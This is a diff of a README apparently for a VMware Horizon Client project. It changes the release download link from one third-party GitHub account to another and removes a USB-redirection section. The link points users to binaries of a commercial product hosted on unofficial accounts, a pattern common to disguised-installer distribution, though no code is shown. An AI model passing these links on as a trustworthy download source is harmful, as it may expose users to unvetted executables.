@@ -1,7 +1,7 @@
 # VMware Horizon Client
 
 Download latest version from Releases:       
-https://github.com/evtfx/VMware-Horizon-Client/releases/tag/2412
+https://github.com/vhlink/VMware-Horizon-Client/releases/tag/2412
 
 ### System Requirements and Setup
 
@@ -124,13 +124,3 @@ vmware-view://desktopName?desktopLayout=fullscreen
 
 * **Extend Displays** to span sessions across multiple monitors.
 * **Assign Specific Monitors** for remote usage only.
-
-### USB and Peripheral Access
-
-Enable USB redirection with:
-
-```sh
-vmware-view://server?connectUSBOnStartup=true
-```
-
-### Audio and Camera Integration
